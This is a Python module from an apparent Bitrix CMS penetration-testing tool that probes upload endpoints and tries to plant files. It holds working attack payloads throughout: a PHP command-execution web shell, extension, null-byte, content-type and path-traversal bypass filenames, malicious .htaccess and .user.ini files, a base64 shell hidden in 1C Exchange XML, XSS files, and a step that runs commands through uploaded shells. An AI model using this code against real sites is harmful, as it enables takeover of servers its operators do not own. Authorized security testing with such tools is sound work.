#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
File Upload Scanner Module for Bitrix Pentest Tool
Tests for: Arbitrary file upload, extension bypass, content-type bypass,
path traversal, race conditions, alternative upload methods
"""

import re
import base64
import random
import string
import hashlib
import time
from urllib.parse import urljoin, quote, urlparse
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict


@dataclass
class UploadFinding:
    """File upload vulnerability finding"""
    severity: str  # critical, high, medium, low
    upload_type: str  # arbitrary, bypass, traversal, race, alternative
    url: str
    parameter: str
    payload: str
    description: str
    evidence: Optional[str] = None
    uploaded_path: Optional[str] = None
    executable: bool = False
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class UploadResult:
    """Results of file upload scanning"""
    target: str
    findings: List[UploadFinding] = field(default_factory=list)
    arbitrary_uploads: List[Dict] = field(default_factory=list)
    bypass_techniques: List[Dict] = field(default_factory=list)
    path_traversals: List[Dict] = field(default_factory=list)
    race_conditions: List[Dict] = field(default_factory=list)
    alternative_methods: List[Dict] = field(default_factory=list)
    
    def add_finding(self, finding: UploadFinding):
        self.findings.append(finding)
        
        finding_dict = finding.to_dict()
        if finding.upload_type == 'arbitrary':
            self.arbitrary_uploads.append(finding_dict)
        elif finding.upload_type == 'bypass':
            self.bypass_techniques.append(finding_dict)
        elif finding.upload_type == 'traversal':
            self.path_traversals.append(finding_dict)
        elif finding.upload_type == 'race':
            self.race_conditions.append(finding_dict)
        elif finding.upload_type == 'alternative':
            self.alternative_methods.append(finding_dict)
    
    def get_critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'critical')
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'target': self.target,
            'summary': {
                'total_findings': len(self.findings),
                'critical': self.get_critical_count(),
                'high': sum(1 for f in self.findings if f.severity == 'high'),
                'arbitrary_uploads': len(self.arbitrary_uploads),
                'bypass_techniques': len(self.bypass_techniques),
                'path_traversals': len(self.path_traversals),
                'race_conditions': len(self.race_conditions),
                'alternative_methods': len(self.alternative_methods),
            },
            'all_findings': [f.to_dict() for f in self.findings]
        }


class BitrixFileUploadScanner:
    """
    File Upload scanner specialized for Bitrix CMS
    """
    
    # Upload endpoints in Bitrix
    UPLOAD_ENDPOINTS = [
        '/bitrix/tools/upload.php',
        '/bitrix/tools/file_dialog/',
        '/bitrix/admin/fileman_file_edit.php',
        '/bitrix/admin/fileman_admin.php',
        '/bitrix/components/bitrix/main.file.input/upload.php',
        '/bitrix/components/bitrix/forum.topic.read/file_upload.php',
        '/bitrix/components/bitrix/blog.post/file_upload.php',
        '/bitrix/components/bitrix/socialnetwork.file.file_upload/',
        '/bitrix/tools/html_editor_action.php',
        '/bitrix/tools/connector.php',
        '/bitrix/admin/1c_exchange.php',
        '/bitrix/admin/restore.php',
        '/bitrix/tools/highloadblock_tools.php',
        '/bitrix/tools/sale_order_import.php',
        '/bitrix/tools/catalog_import.php',
    ]
    
    # Test file payloads
    TEST_FILES = {
        'php_shell': {
            'content': b'<?php system($_GET["cmd"]); ?>',
            'filename': 'shell.php',
            'mimetype': 'application/x-php',
        },
        'php_image': {
            'content': b'GIF89a<?php system($_GET["cmd"]); ?>',
            'filename': 'shell.php.jpg',
            'mimetype': 'image/jpeg',
        },
        'php_double_ext': {
            'content': b'<?php system($_GET["cmd"]); ?>',
            'filename': 'shell.jpg.php',
            'mimetype': 'image/jpeg',
        },
        'php_null': {
            'content': b'<?php system($_GET["cmd"]); ?>',
            'filename': 'shell.php%00.jpg',
            'mimetype': 'image/jpeg',
        },
        'htaccess': {
            'content': b'AddType application/x-httpd-php .jpg\nphp_value auto_prepend_file shell.jpg',
            'filename': '.htaccess',
            'mimetype': 'text/plain',
        },
        'svg_xss': {
            'content': b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
            'filename': 'xss.svg',
            'mimetype': 'image/svg+xml',
        },
        'html_file': {
            'content': b'<script>alert(1)</script>',
            'filename': 'xss.html',
            'mimetype': 'text/html',
        },
        'shtml': {
            'content': b'<!--#exec cmd="id" -->',
            'filename': 'shell.shtml',
            'mimetype': 'text/html',
        },
        'php5': {
            'content': b'<?php system($_GET["cmd"]); ?>',
            'filename': 'shell.php5',
            'mimetype': 'application/x-php',
        },
        'phtml': {
            'content': b'<?php system($_GET["cmd"]); ?>',
            'filename': 'shell.phtml',
            'mimetype': 'application/x-php',
        },
        'user_ini': {
            'content': b'auto_prepend_file=shell.jpg',
            'filename': '.user.ini',
            'mimetype': 'text/plain',
        },
    }
    
    # Bypass techniques
    BYPASS_TECHNIQUES = [
        {'name': 'Case variation', 'filename': 'SHELL.PHP'},
        {'name': 'Double extension', 'filename': 'shell.php.jpg'},
        {'name': 'Reverse double ext', 'filename': 'shell.jpg.php'},
        {'name': 'Null byte', 'filename': 'shell.php\x00.jpg'},
        {'name': 'Path traversal', 'filename': '../../../shell.php'},
        {'name': 'URL encoding', 'filename': 'shell%2ephp'},
        {'name': 'Unicode', 'filename': 'shell.ph\u0070'},
        {'name': 'Trailing dot', 'filename': 'shell.php.'},
        {'name': 'Trailing space', 'filename': 'shell.php '},
        {'name': 'Alternate stream', 'filename': 'shell.php::$DATA'},
        {'name': 'Double dot', 'filename': 'shell..php'},
        {'name': 'Mixed case', 'filename': 'SheLL.pHP'},
    ]
    
    def __init__(self, requester, logger, parser):
        self.requester = requester
        self.logger = logger
        self.parser = parser
        self.uploaded_files = []
        
    def scan(self, target_url: str, aggressive: bool = False) -> UploadResult:
        """
        Main file upload scanning method
        
        Args:
            target_url: Target base URL
            aggressive: Enable race condition and deep bypass tests
        
        Returns:
            UploadResult with all findings
        """
        self.logger.info(f"Starting File Upload scan for {target_url}")
        result = UploadResult(target=target_url)
        
        base_url = self._normalize_url(target_url)
        
        # 1. Discover upload endpoints
        self.logger.info("Discovering upload endpoints...")
        endpoints = self._discover_endpoints(base_url)
        
        # 2. Test basic file uploads
        self.logger.info("Testing basic file uploads...")
        self._test_basic_uploads(base_url, endpoints, result)
        
        # 3. Test extension bypasses
        self.logger.info("Testing extension bypass techniques...")
        self._test_extension_bypass(base_url, endpoints, result)
        
        # 4. Test content-type bypasses
        self.logger.info("Testing content-type bypasses...")
        self._test_content_type_bypass(base_url, endpoints, result)
        
        # 5. Test path traversal
        self.logger.info("Testing path traversal in filenames...")
        self._test_path_traversal(base_url, endpoints, result)
        
        # 6. Test alternative upload methods
        self.logger.info("Testing alternative upload methods...")
        self._test_alternative_methods(base_url, result)
        
        # 7. Test race conditions (if aggressive)
        if aggressive:
            self.logger.info("Testing race conditions...")
            self._test_race_conditions(base_url, endpoints, result)
        
        # 8. Try to execute uploaded files
        if result.findings:
            self.logger.info("Attempting to execute uploaded files...")
            self._test_execution(base_url, result)
        
        # Summary
        total = len(result.findings)
        critical = result.get_critical_count()
        self.logger.info(f"Upload scan complete: {total} findings ({critical} critical)")
        
        return result
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _discover_endpoints(self, base_url: str) -> List[str]:
        """Discover available upload endpoints"""
        found = []
        
        for path in self.UPLOAD_ENDPOINTS:
            url = urljoin(base_url, path)
            try:
                resp = self.requester.get(url, allow_redirects=False)
                
                # Check if endpoint exists (not 404)
                if resp and resp.status_code in [200, 401, 403, 405, 500]:
                    found.append(url)
                    status = "open" if resp.status_code == 200 else "protected"
                    self.logger.info(f"Upload endpoint {status}: {path} ({resp.status_code})")
                    
            except Exception as e:
                self.logger.debug(f"Error checking {path}: {e}")
        
        return found
    
    def _upload_file(self, url: str, file_data: Dict, extra_params: Dict = None, 
                     extra_headers: Dict = None) -> Optional[Any]:
        """Upload file to endpoint"""
        try:
            files = {
                'file': (file_data['filename'], file_data['content'], file_data['mimetype'])
            }
            
            data = extra_params or {}
            headers = extra_headers or {}
            
            resp = self.requester.post(url, files=files, data=data, headers=headers, timeout=15)
            return resp
            
        except Exception as e:
            self.logger.debug(f"Upload error: {e}")
            return None
    
    def _test_basic_uploads(self, base_url: str, endpoints: List[str], result: UploadResult):
        """Test basic file uploads"""
        for endpoint in endpoints:
            self.logger.debug(f"Testing {endpoint}")
            
            for test_name, test_file in self.TEST_FILES.items():
                resp = self._upload_file(endpoint, test_file)
                
                if not resp:
                    continue
                
                # Analyze response
                if resp.status_code == 200:
                    path = self._extract_path(resp.text)
                    
                    if path:
                        severity = 'critical' if test_name in ['php_shell', 'php_image'] else 'high'
                        
                        finding = UploadFinding(
                            severity=severity,
                            upload_type='arbitrary',
                            url=endpoint,
                            parameter='file',
                            payload=test_file['filename'],
                            description=f"File upload accepted: {test_name}",
                            evidence=f"HTTP 200, path: {path}",
                            uploaded_path=path,
                            executable=test_name.startswith('php')
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! UPLOAD ACCEPTED: {test_name} at {endpoint}")
                        
                        if path:
                            self.uploaded_files.append({
                                'url': urljoin(base_url, path),
                                'type': test_name,
                                'endpoint': endpoint
                            })
    
    def _test_extension_bypass(self, base_url: str, endpoints: List[str], result: UploadResult):
        """Test various extension bypass techniques"""
        base_file = self.TEST_FILES['php_shell']
        
        for endpoint in endpoints:
            for technique in self.BYPASS_TECHNIQUES:
                test_file = base_file.copy()
                test_file['filename'] = technique['filename']
                
                resp = self._upload_file(endpoint, test_file)
                
                if resp and resp.status_code == 200:
                    path = self._extract_path(resp.text)
                    
                    if path:
                        finding = UploadFinding(
                            severity='critical',
                            upload_type='bypass',
                            url=endpoint,
                            parameter='file',
                            payload=technique['filename'],
                            description=f"Extension bypass: {technique['name']}",
                            evidence=f"Uploaded as: {path}",
                            uploaded_path=path,
                            executable=True
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! BYPASS: {technique['name']} at {endpoint}")
    
    def _test_content_type_bypass(self, base_url: str, endpoints: List[str], result: UploadResult):
        """Test content-type bypass"""
        base_file = self.TEST_FILES['php_shell']
        
        fake_types = [
            'image/jpeg',
            'image/png',
            'image/gif',
            'text/plain',
            'application/octet-stream',
            'multipart/form-data',
        ]
        
        for endpoint in endpoints:
            for fake_type in fake_types:
                test_file = base_file.copy()
                test_file['mimetype'] = fake_type
                
                resp = self._upload_file(endpoint, test_file)
                
                if resp and resp.status_code == 200:
                    path = self._extract_path(resp.text)
                    
                    if path:
                        finding = UploadFinding(
                            severity='critical',
                            upload_type='bypass',
                            url=endpoint,
                            parameter='file',
                            payload=f"PHP with Content-Type: {fake_type}",
                            description=f"Content-Type bypass: {fake_type}",
                            uploaded_path=path,
                            executable=True
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! CT BYPASS: {fake_type} at {endpoint}")
                        break  # One success is enough
    
    def _test_path_traversal(self, base_url: str, endpoints: List[str], result: UploadResult):
        """Test path traversal in filenames"""
        base_file = self.TEST_FILES['php_shell']
        
        traversal_patterns = [
            '../../../shell.php',
            '..\\..\\..\\shell.php',
            '....//....//....//shell.php',
            '..%2f..%2f..%2fshell.php',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fshell.php',
            'shell.php%00.jpg',
            'shell.php\x00.jpg',
            'shell.php;/',
            'shell.php%20',
        ]
        
        for endpoint in endpoints:
            for pattern in traversal_patterns:
                test_file = base_file.copy()
                test_file['filename'] = pattern
                
                resp = self._upload_file(endpoint, test_file)
                
                if resp and resp.status_code == 200:
                    # Check if file was written outside upload dir
                    path = self._extract_path(resp.text)
                    
                    finding = UploadFinding(
                        severity='critical',
                        upload_type='traversal',
                        url=endpoint,
                        parameter='file',
                        payload=pattern,
                        description=f"Path traversal: {pattern[:30]}...",
                        uploaded_path=path,
                        executable=True
                    )
                    result.add_finding(finding)
                    self.logger.critical(f"!!! TRAVERSAL: {pattern[:30]}... at {endpoint}")
    
    def _test_alternative_methods(self, base_url: str, result: UploadResult):
        """Test alternative upload methods"""
        
        # Test via 1C Exchange
        exchange_url = urljoin(base_url, '/bitrix/admin/1c_exchange.php')
        try:
            xml_payload = """<?xml version="1.0"?>
<КоммерческаяИнформация>
    <Каталог><Товары><Товар>
        <Ид>test</Ид>
        <Наименование>Test</Наименование>
        <Картинка>data:image/php;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+</Картинка>
    </Товар></Товары></Каталог>
</КоммерческаяИнформация>"""
            
            resp = self.requester.post(
                exchange_url,
                data={'type': 'catalog', 'mode': 'import', 'xml': xml_payload},
                timeout=10
            )
            
            if resp and resp.status_code == 200:
                finding = UploadFinding(
                    severity='high',
                    upload_type='alternative',
                    url=exchange_url,
                    parameter='xml',
                    payload='Base64 encoded PHP in XML',
                    description='File upload via 1C Exchange XML',
                    evidence='XML with embedded base64 PHP'
                )
                result.add_finding(finding)
                self.logger.warning(f"1C Exchange upload possible: {exchange_url}")
                
        except Exception as e:
            self.logger.debug(f"1C test error: {e}")
        
        # Test via HTML Editor
        editor_url = urljoin(base_url, '/bitrix/tools/html_editor_action.php')
        try:
            files = {
                'file': ('shell.php', b'<?php system($_GET["cmd"]); ?>', 'application/x-php')
            }
            data = {'action': 'upload', 'type': 'file'}
            
            resp = self.requester.post(editor_url, files=files, data=data, timeout=10)
            
            if resp and resp.status_code == 200 and 'error' not in resp.text.lower():
                finding = UploadFinding(
                    severity='critical',
                    upload_type='alternative',
                    url=editor_url,
                    parameter='file',
                    payload='Direct PHP upload',
                    description='File upload via HTML Editor'
                )
                result.add_finding(finding)
                self.logger.critical(f"!!! EDITOR UPLOAD: {editor_url}")
                
        except Exception as e:
            self.logger.debug(f"Editor test error: {e}")
    
    def _test_race_conditions(self, base_url: str, endpoints: List[str], result: UploadResult):
        """Test race condition vulnerabilities"""
        import threading
        
        for endpoint in endpoints:
            self.logger.debug(f"Testing race condition on {endpoint}")
            
            results = []
            
            def upload_attempt():
                try:
                    files = {
                        'file': ('race.php', b'<?php system($_GET["cmd"]); ?>', 'application/x-php')
                    }
                    resp = self.requester.post(endpoint, files=files, timeout=5)
                    if resp and resp.status_code == 200:
                        path = self._extract_path(resp.text)
                        results.append(path)
                except:
                    pass
            
            # Launch multiple threads
            threads = []
            for _ in range(10):
                t = threading.Thread(target=upload_attempt)
                threads.append(t)
                t.start()
            
            for t in threads:
                t.join()
            
            # Check if we got different results (indicates race condition)
            unique_results = [r for r in results if r]
            if len(unique_results) > 1:
                finding = UploadFinding(
                    severity='high',
                    upload_type='race',
                    url=endpoint,
                    parameter='file',
                    payload='Concurrent upload',
                    description='Race condition in file upload',
                    evidence=f"Multiple successful uploads: {len(unique_results)}"
                )
                result.add_finding(finding)
                self.logger.warning(f"Race condition possible: {endpoint}")
    
    def _extract_path(self, response_text: str) -> Optional[str]:
        """Extract uploaded file path from response"""
        patterns = [
            r'"url":"([^"]+)"',
            r'"path":"([^"]+)"',
            r'"file_name":"([^"]+)"',
            r'"src":"([^"]+)"',
            r'"href":"([^"]+)"',
            r'(/upload/[^"\s]+)',
            r'(/bitrix/tmp/[^"\s]+)',
            r'(https?://[^"\s]+/upload/[^"\s]+)',
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response_text)
            if match:
                path = match.group(1).replace('\\/', '/')
                return path
        
        return None
    
    def _test_execution(self, base_url: str, result: UploadResult):
        """Test if uploaded files are executable"""
        for file_info in self.uploaded_files:
            try:
                # Test PHP execution
                test_url = f"{file_info['url']}?cmd=echo+EXEC_TEST"
                resp = self.requester.get(test_url, timeout=10)
                
                if resp and 'EXEC_TEST' in resp.text:
                    self.logger.critical(f"!!! CODE EXECUTION: {file_info['url']}?cmd=whoami")
                    
                    # Update finding
                    for finding in result.findings:
                        if finding.uploaded_path and finding.uploaded_path in file_info['url']:
                            finding.executable = True
                            
            except Exception as e:
                self.logger.debug(f"Execution test error: {e}")


# Testing
if __name__ == "__main__":
    import sys
    import logging
    sys.path.append('..')
    
    from utils.requester import Requester
    from utils.logger import ColoredLogger
    from utils.parser import BitrixParser
    
    logger = ColoredLogger(level=logging.DEBUG)
    requester = Requester()
    parser = BitrixParser()
    
    scanner = BitrixFileUploadScanner(requester, logger, parser)
    
    if len(sys.argv) > 1:
        result = scanner.scan(sys.argv[1], aggressive=True)
        print(f"\n{'='*60}")
        print(f"CRITICAL: {result.get_critical_count()}")
        print(f"Arbitrary uploads: {len(result.arbitrary_uploads)}")
        print(f"Bypass techniques: {len(result.bypass_techniques)}")
        print(f"Findings: {len(result.findings)}")